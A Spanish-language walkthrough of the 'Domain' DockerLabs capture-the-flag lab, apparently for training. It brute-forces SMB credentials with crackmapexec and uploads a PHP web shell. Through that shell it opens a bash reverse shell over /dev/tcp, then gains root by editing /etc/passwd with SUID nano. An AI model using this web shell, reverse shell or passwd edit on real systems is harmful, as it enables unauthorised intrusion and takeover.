### Domain-DockerLabs🇪🇸

#### 1. Primero lanzamos el laboratorio.
```bash
unzip domain.zip
 sudo bash ./auto_deploy.sh domain.tar 
```

<img width="782" height="324" alt="image" src="https://github.com/user-attachments/assets/5752ee79-8c99-4474-a08b-715b6871f188" />


#### 1.2 Vamos a comprobar que la máquina está en funcionamiento.
```bash
ping -c3 172.17.0.2
```

<img width="774" height="223" alt="image" src="https://github.com/user-attachments/assets/6797a9eb-b5ed-4445-98a3-adb77a6ebe4d" />


#### 2. Ahora mediante nmap vamos a rastrear los puertos abiertos. Detectamos servicios de compartición de archivos e impresoras activos (SMB/NetBIOS).
```bash
nmap -p- -sCV 172.17.0.2
```

<img width="770" height="492" alt="image" src="https://github.com/user-attachments/assets/8b782aaf-46ea-4568-850c-2a8037197bfc" />


#### 2.2 Ahora vamos a buscar los subdominios / fuzz con enum4, el interes que tenemos aqui son los usuarios.
```bash
enum4linux-ng 172.17.0.2
```

<img width="778" height="1053" alt="image" src="https://github.com/user-attachments/assets/35fed3eb-886d-40c5-9987-8dcbfdeffac7" />



#### 3. Para escuchar la información que transmite el servidor vamos a escuchar desde smbclient.
```bash
smbclient -L //172.17.0.2 -N
```

<img width="778" height="247" alt="image" src="https://github.com/user-attachments/assets/b5186e68-7851-4895-bc5a-e94aaab066a2" />


#### 3.2 Ahora realizaremos comprobación con todos los tipos para ver si podemos acceder a alguna, solo nos deja acceder a IPC.
```bash
 smbclient '//172.17.0.2/IPC$' -N
```

<img width="779" height="103" alt="image" src="https://github.com/user-attachments/assets/b4e2bccf-ad12-4779-835d-0dfaf6da77a0" />


#### 3.3 Vamos a forzar un ataque al samba mediante el directorio rockyou y los users que tenemos con crackmapexec.
```bash
crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt |grep -v STATUS_LOGON_FAILURE
```

<img width="851" height="170" alt="image" src="https://github.com/user-attachments/assets/4cb6ac03-f870-4278-b214-b06f4eb1db0d" />

#### 3.4 Ahora vamos con el user bob vamos a enumerar los recursos compartidos.
```bash
smbmap -u 'bob' -p 'star' -H 172.17.0.2
```

<img width="846" height="813" alt="image" src="https://github.com/user-attachments/assets/ceffc655-7412-4850-b32f-2c05a793ca79" />


#### 3.5 Ahora procedemos a mirar que detalles tiene la web.
```bash
whatweb 'http://172.17.0.2'
```

<img width="843" height="136" alt="image" src="https://github.com/user-attachments/assets/d2fee73a-7601-4376-ac4e-953182f69dd9" />

#### 3.6 Vamos a intertar interceptar el samba al saber que es un apache con este php.`nano code.php`
```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```


#### 3.7 Como vimos antes en el smbclient debemos de entrar al html porque en ese disco debe de estar la información que buscamos.
```bash
smbclient //172.17.0.2/html -U bob%star
```

<img width="844" height="218" alt="image" src="https://github.com/user-attachments/assets/f2f2e516-f4b4-4e5c-967f-deed4aa51e5a" />


#### 3.8 Vamos a añadir el php a el html.
```bash
put code.php
```

<img width="838" height="193" alt="image" src="https://github.com/user-attachments/assets/9444a136-f0cc-4876-b82d-cdede6446b20" />


#### 3.9 Comprobaremos en la web en http://172.17.0.2/code.php?cmd=whoami

<img width="1084" height="132" alt="image" src="https://github.com/user-attachments/assets/6be260b7-ee7e-4968-b32d-180a0c99d2f9" />

### 4. Empezaremos a preparar la revershell. 

#### 4.1 Debemos de encontrar mediante urlencode el comando que necesitamos para poner en la web. Debe de ser `http://172.17.0.2/code.php?cmd=bash -c "urlcode"`.
```bash
 urlencode 'bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/4450 0>&1"'
```

#### 4.2 Pondremos a escuchar mediante `nc -lnvp 4450`

#### 4.3 Escribimos en el navegador `http://172.17.0.2/code.php?cmd=bash -c "%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F172.17.0.1%2F4450 0>%261"`. Poniendo el código que a ti te devuelva.

<img width="1919" height="1041" alt="image" src="https://github.com/user-attachments/assets/5acc3126-c215-4454-b28d-40f6acdc6ca9" />


#### 5. Para empezar a buscar la escalada de privilegios vamos a ver que binarios podemos modificar `find / -perm -4000 2>/dev/null`.

<img width="836" height="373" alt="image" src="https://github.com/user-attachments/assets/28b3e21d-28fc-41e0-a921-32d5a816695c" />

#### 5.2 Cambiaremos la tty para tener un mejor control de la terminal.
```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash && stty rows 38 cols 168
```



#### 5.3 Ejecutamos el editor de texto Nano con permisos de superusuario para modificar el archivo donde se almacenan las cuentas de usuario, sus identificadores y sus configuraciones de acceso. Porque `usr/bin/nano` esta asgnado y tendremos que editar el archivo `/etc/passwd`
`aqui editamos el archivo dejando la linea de root asi: root::0:0:root:/root:/bin/bash (solo se elimina la x)`

```bash
/usr/bin/nano /etc/passwd
```

####5.4 Ascendemos con `su`, no he podido hacerlo desde mi terminal kitty/fish porque me dio errores el tty y tuve que hacerlo  desde la consola estándar.

<img width="858" height="530" alt="image" src="https://github.com/user-attachments/assets/3af88604-fa48-41e8-9633-b2210d9edd60" />



